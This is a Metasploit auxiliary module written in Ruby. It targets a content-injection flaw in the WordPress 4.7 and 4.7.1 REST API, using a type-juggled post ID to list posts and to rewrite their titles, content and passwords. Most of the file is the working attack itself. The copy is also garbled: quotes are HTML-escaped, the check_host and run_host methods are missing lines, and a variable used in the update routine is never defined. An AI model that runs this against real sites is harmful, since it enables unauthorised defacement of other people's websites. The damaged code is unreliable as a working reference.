# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;WordPress REST API Content Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a content injection vulnerability in WordPress
        versions 4.7 and 4.7.1 via type juggling in the REST API.
      },
      &#039;Author&#039;         => [
        &#039;Marc Montpas&#039;, # Vulnerability discovery
        &#039;wvu&#039;           # Metasploit module
      ],
      &#039;References&#039;     => [
        [&#039;WPVDB&#039;, &#039;8734&#039;],
        [&#039;URL&#039;,   &#039;https://secure.php.net/manual/en/language.types.type-juggling.php&#039;],
      ],
      &#039;DisclosureDate&#039; => &#039;Feb 1 2017&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Actions&#039;        => [
        [&#039;LIST&#039;,   &#039;Description&#039; => &#039;List posts&#039;],
        [&#039;UPDATE&#039;, &#039;Description&#039; => &#039;Update post&#039;]
      ],
      &#039;DefaultAction&#039;  => &#039;LIST&#039;
    ))

    register_options([
      OptInt.new(&#039;POST_ID&#039;,          [false, &#039;Post ID (0 for all)&#039;, 0]),
      OptString.new(&#039;POST_TITLE&#039;,    [false, &#039;Post title&#039;]),
      OptString.new(&#039;POST_CONTENT&#039;,  [false, &#039;Post content&#039;]),
      OptString.new(&#039;POST_PASSWORD&#039;, [false, &#039;Post password (\&#039;\&#039; for none)&#039;])
    ])

    register_advanced_options([
      OptInt.new(&#039;PostCount&#039;,     [false, &#039;Number of posts to list&#039;, 100]),
      OptString.new(&#039;SearchTerm&#039;, [false, &#039;Search term when listing posts&#039;])
    ])
  end

  def check_host(_ip)
      version = Gem::Version.new(version)
    else
      return Exploit::CheckCode::Safe
    end

    vprint_status("WordPress #{version}: #{full_uri}")

    if version.between?(Gem::Version.new(&#039;4.7&#039;), Gem::Version.new(&#039;4.7.1&#039;))
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Detected
    end
  end

  def run_host(_ip)
      print_error("WordPress not detected at #{full_uri}")
      return
    end

    case action.name
    when &#039;LIST&#039;
      do_list
    when &#039;UPDATE&#039;
      do_update
    end
  end

  def do_list
    posts_to_list = list_posts

    if posts_to_list.empty?
      print_status("No posts found at #{full_uri}")
      return
    end

    tbl = Rex::Text::Table.new(
      &#039;Header&#039;  => "Posts at #{full_uri} (REST API: #{get_rest_api})",
      &#039;Columns&#039; => %w{ID Title URL Password}
    )

    posts_to_list.each do |post|
      tbl << [
        post[:id],
        Rex::Text.html_decode(post[:title]),
        post[:url],
        post[:password] ? &#039;Yes&#039; : &#039;No&#039;
      ]
    end

    print_line(tbl.to_s)
  end

  def do_update
    posts_to_update = []

    if datastore[&#039;POST_ID&#039;] == 0
      posts_to_update = list_posts
    else
      posts_to_update << {id: datastore[&#039;POST_ID&#039;]}
    end

    if posts_to_update.empty?
      print_status("No posts to update at #{full_uri}")
      return
    end

    posts_to_update.each do |post|
      res = update_post(post[:id],
        title:    datastore[&#039;POST_TITLE&#039;],
        content:  datastore[&#039;POST_CONTENT&#039;],
        password: datastore[&#039;POST_PASSWORD&#039;]
      )


      if res && res.code == 200
        print_good("SUCCESS: #{post_url} (Post updated)")
      elsif res && (error = res.get_json_document[&#039;message&#039;])
        print_error("FAILURE: #{post_url} (#{error})")
      end
    end
  end

  def list_posts
    posts = []

    res = send_request_cgi({
      &#039;method&#039;     => &#039;GET&#039;,
      &#039;uri&#039;        => normalize_uri(get_rest_api, &#039;posts&#039;),
      &#039;vars_get&#039;   => {
        &#039;per_page&#039; => datastore[&#039;PostCount&#039;],
        &#039;search&#039;   => datastore[&#039;SearchTerm&#039;]
      }
    }, 3.5)

    if res && res.code == 200
      res.get_json_document.each do |post|
        posts << {
          id:       post[&#039;id&#039;],
          title:    post[&#039;title&#039;][&#039;rendered&#039;],
          url:      post[&#039;link&#039;],
          password: post[&#039;content&#039;][&#039;protected&#039;]
        }
      end
    elsif res && (error = res.get_json_document[&#039;message&#039;])
      vprint_error("Failed to list posts: #{error}")
    end

    posts
  end

  def update_post(id, opts = {})
    payload = {}

    payload[:id]       = "#{id}#{Rex::Text.rand_text_alpha(8)}"
    payload[:title]    = opts[:title] if opts[:title]
    payload[:content]  = opts[:content] if opts[:content]
    payload[:password] = opts[:password] if opts[:password]

    send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(get_rest_api, &#039;posts&#039;, id),
      &#039;ctype&#039;  => &#039;application/json&#039;,
      &#039;data&#039;   => payload.to_json
    }, 3.5)
  end

  def get_rest_api
    return @rest_api if @rest_api

    res = send_request_cgi!({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path)
    }, 3.5)

    if res && res.code == 200
      @rest_api = parse_rest_api(res)
    end

  end

  def parse_rest_api(res)
    rest_api = nil

    link = res.headers[&#039;Link&#039;]
    html = res.get_html_document

    if link =~ %r{^<(.*)>; rel="https://api\.w\.org/"$}
      rest_api = route_rest_api($1)
      vprint_status(&#039;REST API found in Link header&#039;)
    elsif (xpath = html.at(&#039;//link[@rel = "https://api.w.org/"]/@href&#039;))
      rest_api = route_rest_api(xpath)
      vprint_status(&#039;REST API found in HTML document&#039;)
    end

    rest_api
  end

  def route_rest_api(rest_api)
    normalize_uri(path_from_uri(rest_api), &#039;wp/v2&#039;)
  end

end

URL: https://secure.php.net/manual/en/language.types.type-juggling.php

